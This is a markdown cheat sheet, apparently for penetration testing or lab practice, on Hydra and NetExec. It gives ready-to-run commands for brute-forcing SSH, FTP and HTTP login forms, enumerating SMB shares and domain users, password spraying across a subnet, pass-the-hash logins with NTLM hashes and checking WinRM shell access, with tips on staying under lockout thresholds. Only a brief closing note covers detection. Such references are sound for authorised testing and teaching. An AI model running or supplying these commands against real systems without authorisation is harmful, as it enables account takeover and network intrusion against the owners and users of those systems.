# Hydra & NetExec (`nxc`) — Online Brute-Forcing & Network Spraying

> **TL;DR:** **Hydra** brute-forces network logins across 50+ protocols (SSH, FTP, HTTP forms, RDP). **NetExec (`nxc`)**—the modern successor to CrackMapExec—is the go-to tool for Active Directory & SMB/WinRM/LDAP enumeration and safe **password spraying**.

---

## Installation & Availability
```bash
sudo apt install -y hydra netexec
```

---

## 1. Hydra — Essential Flags & Workflows

| Flag | Description |
|------|-------------|
| `-l <user>` / `-L <file>` | Single username (`-l`) or username wordlist (`-L`) |
| `-p <pass>` / `-P <file>` | Single password (`-p`) or password wordlist (`-P`) |
| `-t <num>` | Parallel tasks/threads (default `16`; use `-t 4` for SSH to avoid dropped connections) |
| `-V` / `-f` | Show each attempt (`-V`); stop on first valid credential (`-f`) |
| `-s <port>` | Specify non-standard port |

### Hydra Examples
```bash
# SSH brute-force
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -f ssh://10.10.10.5

# FTP login check
hydra -L users.txt -P passwords.txt ftp://10.10.10.5

# HTTP POST Form brute-force (replace failure string with actual app error message)
hydra -l admin -P passwords.txt 10.10.10.5 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid credentials"
```

---

## 2. NetExec (`nxc`) — Active Directory & SMB/WinRM Workflows

`nxc` supports protocols: `smb`, `winrm`, `ldap`, `ssh`, `rdp`, `mssql`.

| Command | Purpose |
|---------|---------|
| `nxc smb 10.10.10.0/24` | Discover Windows hosts, hostnames, OS versions, and SMB signing status |
| `nxc smb 10.10.10.10 -u '' -p '' --shares` | Check anonymous/null session SMB share access |
| `nxc smb 10.10.10.10 -u alice -p 'Pass123!' --users` | Enumerate domain users using valid credentials |
| `nxc smb 10.10.10.10 -u alice -p 'Pass123!' --pass-pol` | **Check domain password lockout policy BEFORE spraying!** |
| `nxc smb 10.10.10.0/24 -u users.txt -p 'Spring2026!' --continue-on-success` | Password spray 1 password across all users (`Pwn3d!` = local admin!) |
| `nxc smb 10.10.10.10 -u Administrator -H <NTLM_HASH>` | **Pass-the-Hash (PtH)** authentication without knowing the plaintext password |
| `nxc winrm 10.10.10.10 -u alice -p 'Pass123!'` | Test if credentials grant WinRM remote shell access |

---

## Common Pitfalls & Defensive Notes
- **Account Lockout:** Always run `--pass-pol` first in AD environments. If Lockout Threshold is `5`, never try more than 1–2 passwords per observation window.
- **Defensive Tip:** Monitor for **Event ID 4625** (failed logon) bursts from a single source IP across many usernames (spraying) or against one username (brute-force), and enforce **SMB Signing** to block relay attacks.
